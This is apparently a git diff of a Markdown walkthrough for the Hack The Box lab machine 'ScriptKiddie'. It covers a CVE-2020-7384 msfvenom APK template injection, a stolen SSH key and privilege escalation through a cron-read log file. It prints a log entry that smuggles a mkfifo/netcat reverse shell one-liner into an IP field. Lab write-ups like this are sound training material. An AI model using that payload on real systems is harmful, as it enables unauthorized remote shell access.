@@ -1,12 +1,9 @@
-# TEST123
-asdfasdf
-
-## Hackthebox.eu - ScriptKiddie
+# Hackthebox.eu - ScriptKiddie
 **February 7th, 2021**
 
 This box was a web hosted script kiddies tool set. Utilizing known CVEs within the security tools it called on the back-end, we can get a reverse shell. From there we can abuse a poorly secured cronjob, to move laterally to another user who has password-less sudo configured for a tool that allows us to run commands.
 
-### Quick Summary
+## Quick Summary
 * Craft a malicious android APK template for metasploit
 * Upload template to the web front end and get a reverse shell
 * Modify a log file to do bash command injection to get a second reverse shell
@@ -14,11 +11,11 @@ This box was a web hosted script kiddies tool set. Utilizing known CVEs within t
 * Read out the flag from ruby
 
 
-#### Tools requried
+### Tools requried
 Nothing fancy. a standard Ubuntu desktop should have everything you need by default
 
-### Detailed steps
-#### Port Scan
+## Detailed steps
+### Port Scan
 A portscan revealed a python web server on port 5000 and an active sshd service both running on an Ubuntu box of some kind.
 ```bash
 $ nmap -sC -sV -oA nmap/init 10.10.10.226
@@ -43,14 +40,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 
-#### Web Server (:5000)
+### Web Server (:5000)
 This web server was a front end to a bunch of hacking tools. Here's how it was laid out
 
 * **nmap**: Puts the given IP into an nmap command and outputs the result. The input seems to be regex'd for IPs and I couldn't find any injection that worked.
 * **sploits**: Searches for exploits by your given string. I tried command injection but it gives a warning that they will hack you back. This turns out to be important for getting root later.
 * **payloads**: Generates meterpreter binaries for different platforms with an optional template. Only Android and windows seemed to work, while Linux threw an error.
 
-##### CVE-2020-7384 (msfvenom APK template command injection)
+#### CVE-2020-7384 (msfvenom APK template command injection)
 The metasploit templates are binaries that are used as a frame to inject your payload into. Normally, you can use custom templates to help evade anti-virus and intrusion detection systems.
 
 This CVE references the ability to gain command injection by crafting malicious APK templates for an android platform. I found a proof of concept for this attack, but it had a few issues I had to overcome. The resulting PoC I used can be found here: https://gist.github.com/lungdart/2aa3673a872e386ea5ddc36186727711
@@ -63,8 +60,8 @@ uid=1000(kid) gid=1000(kid) groups=1000(kid)
 
 Once I was in as the ```kid``` user, There was an existing SSH key that I stole to stabilize my connection to the box.
 
-#### Privilege escalation to pwn
-##### kid's home directory
+### Privilege escalation to pwn
+#### kid's home directory
 ```kid```'s home directory contain the source code for the website. The code for the searchsploit section showed that an attempt at command execution would have your IP written to the log file ```/home/kid/logs/hackers```, which was empty
 
 ```bash
@@ -74,12 +71,12 @@ kid@scriptkiddie:~$ cat logs/hackers
 
 Taking a look at the home directory itself shows another user named ```pwn```
 
-##### pwn's home directory
+#### pwn's home directory
 ``pwn`` had a suspicious shell script that I had read access to called ```scanlosers.sh```. This script seemed to check the hackers log file from ```kid```'s home directory, and run nmaps on the target and recording the output. After it did this it would erase the file contents. Looking around showed that this script was running extremely often.
 
 Because we had write access to ```/home/kid/logs/hackers```, we could craft an evil entry, that contained command injection instead of an IP. Then when the system ran ```/home/pwn/scanlosers.sh``` it would run my command as the ```pwn``` user, and give me a reverse shell as them. The evil log entry I came up with was ```[2021-02-07 17:57:52.187031] 1.1.1.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 5051 >/tmp/f;```. I ran a netcat listener and put that into the log file, and immediately was gifted with a second reverse shell.
 
-#### Privilege escalation to root
+### Privilege escalation to root
 Checking sudo shows that the ```pwn``` user has password-less sudo access for the msfconsole tool.
 ```bash
 pwn@scriptkiddie:~$ sudo -l
